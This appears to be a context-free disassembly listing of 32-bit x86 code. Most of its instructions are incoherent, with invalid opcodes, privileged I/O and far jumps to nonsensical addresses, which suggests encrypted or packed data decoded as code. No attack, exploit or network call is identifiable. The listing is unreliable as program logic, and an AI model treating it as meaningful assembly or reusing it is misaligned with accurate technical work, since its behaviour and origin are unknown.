  40eff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eff6:	and    bh,BYTE PTR [ebx]
  40eff8:	jne    0x40f020
  40effa:	mov    ds:0x501c5648,al
  40efff:	sbb    eax,0x7a45c3e4
  40f004:	or     dl,BYTE PTR ds:0x7295331
  40f00a:	dec    eax
  40f00b:	int    0x57
  40f00d:	xchg   DWORD PTR es:[ecx*1-0x51353560],edi
  40f015:	cli    
  40f016:	or     DWORD PTR [edx-0xdb98abb],0x93379435
  40f020:	fidivr DWORD PTR [edx+0x57b479b7]
  40f026:	ds dec edi
  40f028:	into   
  40f029:	jle    0x40eff1
  40f02b:	leave  
  40f02c:	push   cs
  40f02d:	xor    DWORD PTR [edi],eax
  40f02f:	jge    0x40f00d
  40f031:	add    ebx,0x31
  40f034:	mov    ds:0xb948cbe3,al
  40f039:	pop    ebx
  40f03a:	leave  
  40f03b:	pop    ebp
  40f03c:	loop   0x40efe7
  40f03e:	jmp    0xae64:0xe504e106
  40f045:	aam    0x65
  40f047:	sub    ecx,esi
  40f049:	xchg   esi,eax
  40f04a:	and    BYTE PTR [ecx],bl
  40f04c:	sbb    al,0xdc
  40f04e:	sub    edx,edx
  40f050:	mov    bh,0x9c
  40f052:	leave  
  40f053:	pop    eax
  40f054:	retf   
  40f055:	clc    
  40f056:	fldenv [ecx-0xcc497bf]
  40f05c:	push   ds
  40f05d:	in     eax,0x2d
  40f05f:	sub    al,0xe9
  40f061:	frstor [ecx-0x9d4842d]
  40f067:	mov    esp,0x16e7c9fa
  40f06c:	cmp    ah,dh
  40f06e:	inc    edi
  40f06f:	push   edi
  40f070:	shr    BYTE PTR [ecx],0x6a
  40f073:	mov    DWORD PTR [edx],ebx
  40f075:	jmp    0x40f0cc
  40f077:	fcomip st,st(5)
  40f079:	inc    edi
  40f07a:	mov    ecx,0x449e2a98
  40f07f:	push   ebx
  40f080:	adc    edx,ebx
  40f082:	es ja  0x40f03b
  40f085:	shl    esi,1
  40f087:	dec    esp
  40f088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f089:	outs   dx,BYTE PTR ds:[esi]
  40f08a:	mov    eax,ds:0x151f0075
  40f08f:	pop    edx
  40f090:	jbe    0x40f04f
  40f092:	rol    DWORD PTR [eax-0x14f3fa29],0x8d
  40f099:	mov    edi,eax
  40f09b:	adc    ebp,DWORD PTR [edx+0xe]
  40f09e:	loop   0x40f109
  40f0a0:	mov    eax,ds:0x6c060993
  40f0a5:	jp     0x40f124
  40f0a7:	js     0x40f046
  40f0a9:	inc    edi
  40f0aa:	mov    esp,eax
  40f0ac:	add    al,0x59
  40f0ae:	ins    DWORD PTR es:[edi],dx
  40f0af:	sar    DWORD PTR [esi+eiz*1],cl
  40f0b2:	or     edx,DWORD PTR ds:0x1ece2a97
  40f0b8:	(bad)  
  40f0b9:	fisubr DWORD PTR [eax]
  40f0bb:	stos   DWORD PTR es:[edi],eax
  40f0bc:	jmp    0x814d61cb
  40f0c1:	ret    0x1c72
  40f0c4:	into   
  40f0c5:	mov    al,ds:0xff6d4c29
  40f0ca:	icebp  
  40f0cb:	mov    ss,WORD PTR [ebp+esi*8+0x2fefb1bb]
  40f0d2:	mov    ds:0x1c300a3e,eax
  40f0d7:	and    DWORD PTR [esi],ebx
  40f0d9:	and    eax,DWORD PTR [esi]
  40f0db:	lods   al,BYTE PTR ds:[esi]
  40f0dc:	shl    DWORD PTR [edi+0x6d8d1d7a],0x87
  40f0e3:	xchg   DWORD PTR [ebp+0x70],ecx
  40f0e6:	imul   ebx,DWORD PTR [ecx+0x3],0x146283fc
  40f0ed:	pop    ss
  40f0ee:	pop    esp
  40f0ef:	prefetcht1 BYTE PTR [edi+0x3553f00f]
  40f0f6:	scas   eax,DWORD PTR es:[edi]
  40f0f7:	xor    BYTE PTR [ecx+0x52],ch
  40f0fa:	int3   
  40f0fb:	lea    ebp,[edx+0x4b55c809]
  40f101:	ds pusha 
  40f103:	repnz icebp 
  40f105:	xor    ah,BYTE PTR [ebp+0x5a]
  40f108:	jge    0x40f12a
  40f10a:	pop    esi
  40f10b:	jne    0x40f16a
  40f10d:	mov    ch,0x82
  40f10f:	xor    DWORD PTR [ebp-0x1e],esp
  40f112:	cli    
  40f113:	(bad)  
  40f115:	sub    dh,BYTE PTR [ebx+0x69b6520c]
  40f11b:	adc    edx,DWORD PTR [eax+0x6]
  40f11e:	sbb    ah,bh
  40f120:	popf   
  40f121:	daa    
  40f122:	pop    edx
  40f123:	pop    edi
  40f124:	sub    edi,DWORD PTR [eax-0x5080fb6f]
  40f12a:	pop    ss
  40f12b:	pop    eax
  40f12c:	pop    esi
  40f12d:	sbb    esi,DWORD PTR [edx-0x53297a4d]
  40f133:	fsubr  DWORD PTR [ecx]
  40f135:	(bad)  
  40f136:	int3   
  40f137:	cmp    ebp,DWORD PTR [edi]
  40f139:	push   ebp
  40f13a:	and    BYTE PTR [ebp+0x1f],0xad
  40f13e:	out    0xcb,eax
  40f140:	in     eax,dx
  40f141:	test   eax,0xc02037a
  40f146:	retf   
  40f147:	dec    esi
  40f148:	cmp    esp,DWORD PTR [esi+0x267f486e]
  40f14e:	xchg   DWORD PTR [ecx],edi
  40f150:	(bad)  
  40f151:	mov    esi,0x4f3edf8a
  40f156:	js     0x40f15c
  40f158:	test   eax,0xa4dd52b2
  40f15d:	lock push ebp
  40f15f:	mov    ebx,0x1941e927
  40f164:	repnz cmp dh,BYTE PTR [esp+edi*4+0x12ee0f29]
  40f16c:	inc    edx
  40f16d:	xchg   esi,eax
  40f16e:	xor    al,0xf0
  40f170:	stos   BYTE PTR es:[edi],al
  40f171:	sbb    BYTE PTR [esi+0x595f24d],0x73
  40f178:	in     eax,dx
  40f179:	mov    al,dh
  40f17b:	mov    dh,0xf4
  40f17d:	xchg   esp,eax
  40f17e:	cwde   
  40f17f:	xchg   BYTE PTR [edi],dh
  40f181:	xchg   BYTE PTR ds:0x744db5d4,cl
  40f187:	push   ebp
  40f188:	bnd js 0x40f1a2
  40f18b:	xchg   esi,eax
  40f18c:	lock sbb ebx,DWORD PTR [ebp-0x1]
  40f190:	mov    eax,fs:0xa1be5281
  40f196:	mov    eax,0x5eb57b78
  40f19b:	mov    ds:0xd7813067,eax
  40f1a0:	dec    ecx
  40f1a1:	sbb    eax,0x5b37aa33
  40f1a6:	jnp    0x40f1d7
  40f1a8:	rol    BYTE PTR [edx+0x46],cl
  40f1ab:	inc    eax
  40f1ac:	xor    al,0x70
  40f1ae:	loopne 0x40f138
  40f1b0:	xor    ch,BYTE PTR [ebx+0xe]
  40f1b3:	popf   
  40f1b4:	ret    0xf1c9
  40f1b7:	lods   al,BYTE PTR ds:[esi]
  40f1b8:	in     al,0x21
  40f1ba:	std    
  40f1bb:	js     0x40f184
  40f1bd:	mov    eax,0xddb41a47
  40f1c2:	pushf  
  40f1c3:	les    esp,FWORD PTR ds:0x7659c7ff
  40f1c9:	ror    DWORD PTR [ebx],0x4c
  40f1cc:	jmp    0x40f17b
  40f1ce:	leave  
  40f1cf:	loop   0x40f210
  40f1d1:	hlt    
  40f1d2:	dec    eax
  40f1d3:	ror    DWORD PTR [ebp+0x2],1
  40f1d6:	push   edx
  40f1d7:	mul    DWORD PTR [esi+0x3b]
  40f1da:	imul   esp,DWORD PTR [ebx],0x5c
  40f1dd:	sbb    al,bh
  40f1df:	jns    0x40f1e0
  40f1e1:	mov    cl,0xa5
  40f1e3:	mov    al,ds:0xd138bdc6
  40f1e8:	fsub   QWORD PTR [ebx+edi*4+0x22]
  40f1ec:	xor    eax,0x643a7515
  40f1f1:	sar    DWORD PTR [ebx+esi*2+0x237ea338],1
  40f1f8:	mov    cl,0x52
  40f1fa:	pop    ebx
  40f1fb:	mov    ebx,0x2304ec8c
  40f200:	jmp    0x136e:0x47340339
  40f207:	mov    ebx,esi
  40f209:	sub    cl,bh
  40f20b:	js     0x40f269
  40f20d:	inc    eax
  40f20e:	jne    0x40f214
  40f210:	das    
  40f211:	xlat   BYTE PTR ds:[ebx]
  40f212:	daa    
  40f213:	fucomi st,st(5)
  40f215:	nop
  40f216:	rol    ch,0xa2
  40f219:	mov    ecx,0xa89a8b49
  40f21e:	ja     0x40f28e
  40f220:	cmp    dh,bl
  40f222:	mov    ds:0x2dbdcc5a,al
  40f227:	ret    
  40f228:	fst    DWORD PTR [ebx-0x4f]
  40f22b:	and    dl,BYTE PTR [edi]
  40f22d:	and    ch,BYTE PTR [eax-0x63]
  40f230:	cmp    eax,0x3ec7da67
  40f235:	jmp    0x40f1f0
  40f237:	pusha  
  40f238:	jns    0x40f216
  40f23a:	int    0xe0
  40f23c:	sti    
  40f23d:	ficomp DWORD PTR [esi+0x26cb02a2]
  40f243:	inc    edx
  40f244:	ins    DWORD PTR es:[edi],dx
  40f245:	pop    esi
  40f246:	icebp  
  40f247:	jecxz  0x40f27e
  40f249:	sar    DWORD PTR [ebx+0x70cef843],0x6d
  40f250:	call   0x8294e7d9
  40f255:	adc    al,0x39
  40f257:	nop
  40f258:	pop    ebp
  40f259:	jecxz  0x40f2a2
  40f25b:	or     ecx,0x6f
  40f25e:	test   eax,0x2f3f9f19
  40f263:	xor    bl,BYTE PTR [edi]
  40f265:	inc    edx
  40f266:	add    ebp,ebx
  40f268:	in     eax,0x14
  40f26a:	and    edx,0xb68ad1dc
  40f270:	dec    ebp
  40f271:	inc    ecx
  40f272:	jns    0x40f20f
  40f274:	(bad)  
  40f275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f276:	pop    ecx
  40f277:	pop    ebx
  40f278:	ret    0x104e
  40f27b:	ins    DWORD PTR es:[edi],dx
  40f27c:	mov    ds:0xf064c0be,al
  40f281:	in     al,dx
  40f282:	inc    esi
  40f283:	sbb    eax,0x145ff973
  40f288:	rol    bl,cl
  40f28a:	inc    edx
  40f28b:	shl    ebp,1
  40f28d:	retf   
  40f28e:	cli    
  40f28f:	ds in  al,0x9d
  40f292:	dec    esi
  40f293:	sub    al,0x87
  40f295:	or     al,BYTE PTR [edi+0x6cd5b534]
  40f29b:	clc    
  40f29c:	push   ss
  40f29d:	aaa    
  40f29e:	add    BYTE PTR [eax-0x52],bl
  40f2a1:	pop    edx
  40f2a2:	inc    esi
  40f2a3:	les    ebx,FWORD PTR [ecx-0x142049ee]
  40f2a9:	aad    0xc0
  40f2ab:	dec    eax
  40f2ac:	mov    ch,0x57
  40f2ae:	ds pushf 
  40f2b0:	pop    esi
  40f2b1:	xchg   esp,eax
  40f2b2:	sbb    ah,BYTE PTR [eax-0xf]
  40f2b5:	cld    
  40f2b6:	sbb    dl,BYTE PTR [ebx-0x5e]
  40f2b9:	mov    ebx,0xe7834297
  40f2be:	xchg   ebp,eax
  40f2bf:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40f2c1:	dec    ebp
  40f2c2:	mov    bh,0xf6
  40f2c4:	jg     0x40f30e
  40f2c6:	fist   DWORD PTR [eax-0x22]
  40f2c9:	imul   ebx,ebp,0x16
  40f2cc:	inc    edx
  40f2cd:	enter  0xe3c5,0x5
  40f2d1:	sar    al,cl
  40f2d3:	xchg   ecx,eax
  40f2d4:	push   esp
  40f2d5:	jbe    0x40f2e5
  40f2d7:	pop    ebp
  40f2d8:	sub    DWORD PTR [edx],0xffffff9c
  40f2db:	fnsave [ecx+ebx*8+0x43]
  40f2df:	repz mov cl,0x82
  40f2e2:	stos   BYTE PTR es:[edi],al
  40f2e3:	rcr    al,cl
  40f2e5:	les    ebp,FWORD PTR [ecx]
  40f2e7:	mov    ah,0xfb
  40f2e9:	pop    edx
  40f2ea:	fld    DWORD PTR [edi]
  40f2ec:	push   eax
  40f2ed:	mov    ch,0xa8
  40f2ef:	or     al,0xe3
  40f2f1:	lock sbb DWORD PTR [ebx],esi
  40f2f4:	mov    BYTE PTR [ebx],0xc7
  40f2f7:	push   eax
  40f2f8:	mov    eax,DWORD PTR [ebp-0x18]
  40f2fb:	add    eax,0xee
  40f300:	push   eax
  40f301:	mov    eax,DWORD PTR [ebp-0x18]
  40f304:	mov    eax,DWORD PTR [eax+0x198]
  40f30a:	jmp    0x40f815
  40f30f:	enter  0x3ec7,0xce
  40f313:	aad    0xd5
  40f315:	enter  0x6cc5,0x2b
  40f319:	xchg   edi,eax
  40f31a:	and    eax,edi
  40f31c:	dec    eax
  40f31d:	sbb    al,0xcd
  40f31f:	pusha  
  40f320:	push   eax
  40f321:	js     0x40f39b
  40f323:	push   0x7c
  40f325:	js     0x40f39f
  40f327:	lods   al,BYTE PTR ds:[esi]
  40f328:	popf   
  40f329:	ds ds arpl sp,bx
  40f32d:	cmp    DWORD PTR [edx-0x7d],0x4e6160c2
  40f334:	icebp  
  40f335:	jge    0x40f2cc
  40f337:	pop    edx
  40f338:	fdiv   st,st(1)
  40f33a:	jmp    0xb32ccdcf
  40f33f:	xlat   BYTE PTR ds:[ebx]
  40f340:	call   0x7ec34217
  40f345:	add    al,0xde
  40f347:	out    0x5a,eax
  40f349:	dec    esp
  40f34a:	cmp    DWORD PTR [ecx],ebx
  40f34c:	push   ss
  40f34d:	add    al,0xb4
  40f34f:	out    dx,eax
  40f350:	mov    cl,0xe2
  40f352:	mov    edx,0x80828741
  40f357:	cld    
  40f358:	pop    ebx
  40f359:	mov    WORD PTR [eax+ebp*4+0x7e6d68ef],gs
  40f360:	nop
  40f361:	cld    
  40f362:	cli    
  40f363:	push   ebx
  40f364:	das    
  40f365:	aad    0x11
  40f367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f368:	pop    ebp
  40f369:	and    ebp,DWORD PTR [edi+0x692cebc9]
  40f36f:	and    BYTE PTR [ebp+0x37],0xfb
  40f373:	stos   DWORD PTR es:[edi],eax
  40f374:	leave  
  40f375:	sub    eax,0xf90aee5e
  40f37a:	pop    edx
  40f37b:	mov    eax,0xd7fc822f
  40f380:	lods   al,BYTE PTR ds:[esi]
  40f381:	not    BYTE PTR [eax-0xe]
  40f384:	imul   edx,ebx,0xa3253df5
  40f38a:	frstor [ebp+0x240496b0]
  40f390:	lea    eax,ds:0xad2ca3dd
  40f396:	cmp    bl,BYTE PTR [ebx+0x4]
  40f399:	clc    
  40f39a:	imul   DWORD PTR [ebx-0x6c]
  40f39d:	aas    
  40f39e:	enter  0xaf2d,0xc6
  40f3a2:	lea    esi,[edi+0x3c]
  40f3a5:	scas   eax,DWORD PTR es:[edi]
  40f3a6:	daa    
  40f3a7:	daa    
  40f3a8:	jmp    0x40f367
  40f3aa:	dec    eax
  40f3ab:	mov    dl,0xe1
  40f3ad:	pop    ds
  40f3ae:	data16 jne 0x40f3b3
  40f3b1:	aam    0xe9
  40f3b3:	pop    ebx
  40f3b4:	xor    DWORD PTR [esi-0x2a],esi
  40f3b7:	mov    ecx,0xa6bedf7
  40f3bc:	rcr    DWORD PTR [ebx],1
  40f3be:	push   edi
  40f3bf:	xor    DWORD PTR [ebp+0x16],edx
  40f3c2:	arpl   WORD PTR [eax],bx
  40f3c4:	iret   
  40f3c5:	sub    dh,BYTE PTR [ecx]
  40f3c7:	cmp    al,0x7a
  40f3c9:	ss (bad) 
  40f3cb:	jle    0x40f362
  40f3cd:	pop    esi
  40f3ce:	inc    esp
  40f3cf:	add    DWORD PTR [ebp-0x1bdb9f21],eax
  40f3d5:	add    bl,bh
  40f3d7:	pop    ebp
  40f3d8:	pop    ds
  40f3d9:	rcr    BYTE PTR [ecx+0x3],1
  40f3dc:	mov    bh,0xb
  40f3de:	mov    dh,0xb1
  40f3e0:	jne    0x40f3aa
  40f3e2:	shl    BYTE PTR [ebp+0x44b52af9],cl
  40f3e8:	int    0x94
  40f3ea:	into   
  40f3eb:	in     eax,0x27
  40f3ed:	div    DWORD PTR [esp+esi*8-0x37497298]
  40f3f4:	fmul   DWORD PTR [ebp+0x4396069e]
  40f3fa:	(bad)  
  40f3fc:	jp     0x40f43a
  40f3fe:	inc    esp
  40f3ff:	mov    ebp,0x702f481c
  40f404:	jge    0x40f452
  40f406:	inc    esp
  40f407:	xor    dh,dl
  40f409:	jns    0x40f421
  40f40b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40f40d:	dec    eax
  40f40e:	and    BYTE PTR [ebp-0x19],dh
  40f411:	dec    esi
  40f413:	jmp    0x40f3b0
  40f415:	loope  0x40f45f
  40f417:	cmp    al,0x3d
  40f419:	adc    edx,DWORD PTR [edi]
  40f41b:	(bad)  
  40f41c:	adc    ebp,DWORD PTR [eax+0x33]
  40f41f:	mov    ds:0xd627defc,al
  40f424:	cmp    al,0xfe
  40f426:	cmp    al,0x21
  40f428:	call   0xa01926a4
  40f42d:	psllw  mm6,QWORD PTR [ecx]
  40f430:	pop    esi
  40f431:	fcom   DWORD PTR [esi-0x61]
  40f434:	xchg   ebp,eax
  40f435:	in     al,dx
  40f436:	inc    ebp
  40f437:	lock nop
  40f439:	shl    dh,0xe0
  40f43c:	popf   
  40f43d:	sahf   
  40f43e:	sahf   
  40f43f:	dec    ecx
  40f440:	ja     0x40f3e9
  40f442:	cwde   
  40f443:	push   esp
  40f444:	retf   0xa659
  40f447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f448:	dec    ebp
  40f449:	lea    esi,[edx-0x70171171]
  40f44f:	dec    eax
  40f450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f451:	fcomi  st,st(3)
  40f453:	push   cs
  40f454:	jne    0x40f477
  40f456:	shl    DWORD PTR [edx-0x5b7e5a81],cl
  40f45c:	in     eax,0x9
  40f45e:	sbb    eax,0xb1293782
  40f463:	jge    0x40f400
  40f465:	inc    edi
  40f466:	inc    edi
  40f467:	sub    ecx,esi
  40f469:	jg     0x40f3f4
  40f46b:	cmp    esp,DWORD PTR [ebp+edx*1-0x49101367]
  40f472:	dec    edx
  40f473:	aad    0xd
  40f475:	xor    ebx,DWORD PTR [ebx+0x343e4b]
  40f47b:	fldcw  WORD PTR [ebp+ecx*1+0x6a]
  40f47f:	or     dh,BYTE PTR [edi+0x20d65fc4]
  40f485:	sbb    DWORD PTR [esi+esi*1],esi
  40f488:	xor    eax,0xe70b692b
  40f48d:	mov    ecx,0xf1dcbb76
  40f492:	std    
  40f493:	iret   
  40f494:	(bad)  [ebp+ebp*4+0xb0f0c16]
  40f49b:	add    DWORD PTR [edx],ebp
  40f49d:	mov    edi,0x8adcc29e
  40f4a2:	jge    0x40f476
  40f4a4:	xlat   BYTE PTR ds:[ebx]
  40f4a5:	rcr    DWORD PTR [ebx+0x1f],1
  40f4a8:	mov    edx,0xea30d0f0
  40f4ad:	aas    
  40f4ae:	sub    DWORD PTR [edx+0x4a],ebp
  40f4b1:	scas   eax,DWORD PTR es:[edi]
  40f4b2:	xor    BYTE PTR [esi-0x75],al
  40f4b5:	xchg   esp,edi
  40f4b7:	outs   dx,BYTE PTR ds:[esi]
  40f4b8:	fstp   DWORD PTR [ebp-0x27c3c9dd]
  40f4be:	cmp    DWORD PTR [esi-0x4d],0x3be16fad
  40f4c5:	dec    edi
  40f4c6:	(bad)  
  40f4c7:	dec    eax
  40f4c8:	jmp    0x40f520
  40f4ca:	sub    DWORD PTR [ebp+0x61],eax
  40f4cd:	adc    al,0xb7
  40f4cf:	push   es
  40f4d0:	retf   0xc53c
  40f4d3:	lods   eax,DWORD PTR ds:[esi]
  40f4d4:	jmp    0x40f552
  40f4d6:	stc    
  40f4d7:	mov    ds:0x806732bc,eax
  40f4dc:	imul   esp,DWORD PTR [ecx],0x71ddb747
  40f4e2:	xor    BYTE PTR [ebx+ebp*4-0x80],ah
  40f4e6:	lahf   
  40f4e7:	fcmovne st,st(5)
  40f4e9:	pop    ds
  40f4ea:	dec    ebp
  40f4eb:	add    eax,0xa7b229e
  40f4f0:	pop    edi
  40f4f1:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f3:	xchg   edi,eax
  40f4f4:	cmp    al,bl
  40f4f6:	mov    edi,0x9407db2b
  40f4fb:	jmp    0x258a8390
  40f500:	jg     0x40f536
  40f502:	inc    esp
  40f503:	inc    ebp
  40f504:	lea    ecx,[esi+0x44]
  40f507:	mov    ah,0xc3
  40f509:	jmp    0xcac0:0xe35120d4
  40f510:	call   0x77be:0x479afe7f
  40f517:	dec    ebp
  40f518:	sti    
  40f519:	mov    ecx,0x336cc62b
  40f51e:	xchg   edi,eax
  40f51f:	mov    bl,0x95
  40f521:	xor    DWORD PTR [esi-0x24528c38],eax
  40f527:	scas   al,BYTE PTR es:[edi]
  40f528:	loope  0x40f56b
  40f52a:	scas   eax,DWORD PTR es:[edi]
  40f52b:	arpl   ax,bp
  40f52d:	imul   ecx,eax,0x686feedd
  40f533:	fnstsw WORD PTR [ebx]
  40f535:	push   ebx
  40f536:	xor    DWORD PTR [edi+0x4a11412d],esp
  40f53c:	jecxz  0x40f5b5
  40f53e:	add    BYTE PTR [edi+0x3f913e50],al
  40f544:	leave  
  40f545:	or     ebx,DWORD PTR [eax]
  40f547:	push   esi
  40f548:	push   0xffffff90
  40f54a:	and    al,0x32
  40f54c:	out    0x8d,al
  40f54e:	test   eax,0x2880a91b
  40f553:	fstp   DWORD PTR [ecx*8-0x31ac7dd6]
  40f55a:	inc    esi
  40f55b:	push   ecx
  40f55c:	push   ebx
  40f55d:	adc    eax,DWORD PTR [edx+ebp*4]
  40f560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f561:	stc    
  40f562:	jno    0x40f5d4
  40f564:	mov    ebp,0x1698d57f
  40f569:	or     al,0xcc
  40f56b:	push   cs
  40f56c:	mov    BYTE PTR [edi],al
  40f56e:	ds and eax,0x34cc935f
  40f574:	js     0x40f557
  40f576:	inc    eax
  40f577:	daa    
  40f578:	inc    esp
  40f579:	pop    ebp
  40f57a:	cmp    bl,0xa8
  40f57d:	test   DWORD PTR [esi],ebp
  40f57f:	hlt    
  40f580:	std    
  40f581:	data16 fs int3 
  40f584:	test   al,0xc0
  40f586:	aad    0xe7
  40f588:	cmp    ecx,esp
  40f58a:	sti    
  40f58b:	xchg   ebp,eax
  40f58c:	xchg   BYTE PTR [edx+0x6c],dl
  40f58f:	jp     0x40f5bc
  40f591:	ret    
  40f592:	outs   dx,DWORD PTR ds:[esi]
  40f593:	lods   eax,DWORD PTR ds:[esi]
  40f594:	sbb    BYTE PTR [edi],al
  40f596:	repnz and al,0x5a
  40f599:	jae    0x40f610
  40f59b:	sub    bl,0x78
  40f59e:	loop   0x40f599
  40f5a0:	retf   
  40f5a1:	fdivr  QWORD PTR [eax]
  40f5a3:	push   ebp
  40f5a4:	(bad)  
  40f5a5:	or     ebx,DWORD PTR [esi-0x3b]
  40f5a8:	xor    eax,0x518babb2
  40f5ad:	mov    DWORD PTR [edi],esp
  40f5af:	retf   0x8ba4
  40f5b2:	call   0xf2f1:0x96ea222e
  40f5b9:	popf   
  40f5ba:	cld    
  40f5bb:	lea    ecx,[edx]
  40f5bd:	lea    eax,[ecx]
  40f5bf:	sub    edi,0xfe7990c5
  40f5c5:	in     al,0xbf
  40f5c7:	fcomp  QWORD PTR [edi-0x2e]
  40f5ca:	(bad)  
  40f5cb:	push   ds
  40f5cc:	add    bl,dl
  40f5ce:	xor    esi,DWORD PTR [ebp-0x57a37a48]
  40f5d4:	inc    esp
  40f5d5:	pop    esp
  40f5d6:	pop    eax
  40f5d7:	or     esi,DWORD PTR [edx]
  40f5d9:	xchg   edi,eax
  40f5da:	outs   dx,DWORD PTR ds:[esi]
  40f5db:	push   ebx
  40f5dc:	sub    ebp,ebx
  40f5de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5df:	outs   dx,DWORD PTR ds:[esi]
  40f5e0:	jae    0x40f632
  40f5e2:	in     eax,dx
  40f5e3:	mov    BYTE PTR [ebp+0x4b],dh
  40f5e6:	dec    esp
  40f5e7:	fsubr  st(7),st
  40f5e9:	mov    ebx,0x97ff13e8
  40f5ee:	sqrtps xmm4,XMMWORD PTR [edi]
  40f5f1:	(bad)  
  40f5f2:	sti    
  40f5f3:	std    
  40f5f4:	inc    esp
  40f5f5:	dec    edi
  40f5f6:	sahf   
  40f5f7:	imul   ebp,DWORD PTR [edi+edi*8+0x42ce1912],0xd6651255
  40f602:	shl    DWORD PTR ds:[edx+0x350bb121],0x5e
  40f60a:	mov    ds:0x310899c4,eax
  40f60f:	jns    0x40f606
  40f611:	retf   0x3850
  40f614:	mov    WORD PTR [esi+0x6d],ds
  40f617:	sahf   
  40f618:	fadd   DWORD PTR [ecx+0x291131ed]
  40f61e:	jne    0x40f5b1
  40f620:	repz ficomp DWORD PTR [esp+ebp*1-0x64]
  40f625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f626:	pop    ebx
  40f627:	pop    ebp
  40f628:	inc    ebx
  40f629:	push   cs
  40f62a:	adc    cl,BYTE PTR [ebp+edi*8+0x66]
  40f62e:	cmp    bl,al
  40f630:	aad    0x4e
  40f632:	sbb    BYTE PTR [edx],ah
  40f634:	push   eax
  40f635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f636:	mov    ch,0x76
  40f638:	sbb    DWORD PTR [ecx+0x62],edx
  40f63b:	cmp    DWORD PTR cs:[eax+eiz*4],0xffffffa2
  40f640:	test   eax,0x88fbdd6a
  40f645:	pop    ds
  40f646:	sub    BYTE PTR [ebp+0x26cba2c2],0x81
  40f64d:	cli    
  40f64e:	inc    esi
  40f64f:	sub    dh,BYTE PTR [esi+0x2a]
  40f652:	dec    ebx
  40f653:	cld    
  40f654:	pop    edx
  40f655:	ret    0xde86
  40f658:	sub    al,0x2f
  40f65a:	inc    ebx
  40f65b:	dec    ebp
  40f65c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f65d:	std    
  40f65e:	imul   esi,DWORD PTR [edx-0x45b4f61a],0x8
  40f665:	mov    dl,BYTE PTR [esi]
  40f667:	jns    0x40f6a0
  40f669:	pop    es
  40f66a:	retf   
  40f66b:	pop    ecx
  40f66c:	nop
  40f66d:	and    eax,0x7d06706a
  40f672:	jmp    0xff56:0x91206481
  40f679:	jae    0x40f68b
  40f67b:	ror    DWORD PTR [edi+0x74],cl
  40f67e:	adc    DWORD PTR [ecx-0x55],eax
  40f681:	dec    ebp
  40f682:	or     eax,ebx
  40f684:	rcl    DWORD PTR [ecx],1
  40f686:	ins    BYTE PTR es:[edi],dx
  40f687:	xchg   edi,eax
  40f688:	enter  0x810a,0x72
  40f68c:	sub    BYTE PTR [eax-0x4f],ah
  40f68f:	aaa    
  40f690:	test   eax,0x14834f01
  40f695:	sbb    esi,DWORD PTR [eax]
  40f697:	inc    edi
  40f698:	lahf   
  40f699:	enter  0x396b,0x0
  40f69d:	mov    ch,0x0
  40f69f:	cmp    BYTE PTR [edx-0x6d099d5c],bh
  40f6a5:	xor    eax,esp
  40f6a7:	retf   0xecf2
  40f6aa:	add    BYTE PTR [esp+eax*4],bl
  40f6ad:	imul   ebp,esp,0xc02b5147
  40f6b3:	jne    0x40f664
  40f6b5:	fdivr  DWORD PTR [esi+edx*1-0xa99203f]
  40f6bc:	(bad)  
  40f6bd:	fidiv  DWORD PTR [esi-0x451061c9]
  40f6c3:	clc    
  40f6c4:	sub    esp,edx
  40f6c6:	or     eax,0xae28147e
  40f6cb:	das    
  40f6cc:	jb     0x40f6e6
  40f6ce:	jmp    0xf04a:0x7e996e63
  40f6d5:	sub    eax,0xb02704c
  40f6da:	xor    BYTE PTR [ebx],ch
  40f6dc:	mov    ebp,0xcc5d4602
  40f6e1:	mov    esi,0x885b91f6
  40f6e6:	xor    eax,0x8901f41b
  40f6eb:	fwait
  40f6ec:	shr    BYTE PTR [esi-0x52],cl
  40f6ef:	int    0x1a
  40f6f1:	sbb    eax,0xf86b5897
  40f6f6:	mov    bl,0xf2
  40f6f8:	jne    0x40f6b6
  40f6fa:	and    ecx,DWORD PTR [ebx-0x34]
  40f6fd:	fisub  DWORD PTR [ecx]
  40f6ff:	mov    eax,ds:0x7864b564
  40f704:	test   DWORD PTR [eax+0x2049f835],ecx
  40f70a:	shl    DWORD PTR [edi],1
  40f70c:	xchg   ebx,eax
  40f70d:	mov    DWORD PTR [eax-0x59ed488a],0xca9d000c
  40f717:	xchg   DWORD PTR [esi],edx
  40f719:	ror    BYTE PTR [ecx-0x5e018c46],1
  40f71f:	scas   al,BYTE PTR es:[edi]
  40f720:	push   ss
  40f721:	stos   DWORD PTR es:[edi],eax
  40f722:	mov    esp,0x656b763
  40f727:	xor    dl,BYTE PTR [edx]
  40f729:	xchg   edx,eax
  40f72a:	jno    0x40f747
  40f72c:	mov    ch,0xd1
  40f72e:	and    al,0x7b
  40f730:	clc    
  40f731:	lods   eax,DWORD PTR ds:[esi]
  40f732:	icebp  
  40f733:	ret    
  40f734:	enter  0x162b,0x52
  40f738:	cmp    al,0xbe
  40f73a:	adc    DWORD PTR [edx],edi
  40f73c:	or     ah,BYTE PTR [ebx+0xa45cd64]
  40f742:	fcom   DWORD PTR [edi+0x14df910c]
  40f748:	push   ss
  40f749:	fwait
  40f74a:	jp     0x40f752
  40f74c:	sub    dl,al
  40f74e:	sahf   
  40f74f:	mov    eax,0x39d3ebc4
  40f754:	dec    edi
  40f755:	jns    0x40f7cf
  40f757:	pop    ecx
  40f758:	adc    bl,BYTE PTR gs:[eax]
  40f75b:	pop    esi
  40f75c:	push   ebx
  40f75d:	repz das 
  40f75f:	ins    BYTE PTR es:[edi],dx
  40f760:	or     BYTE PTR [ebp-0x5a88f25d],ah
  40f766:	(bad)  
  40f768:	sub    DWORD PTR [ecx+0x6f],0x9b184338
  40f76f:	outs   dx,BYTE PTR ds:[esi]
  40f770:	add    DWORD PTR cs:[edx],edi
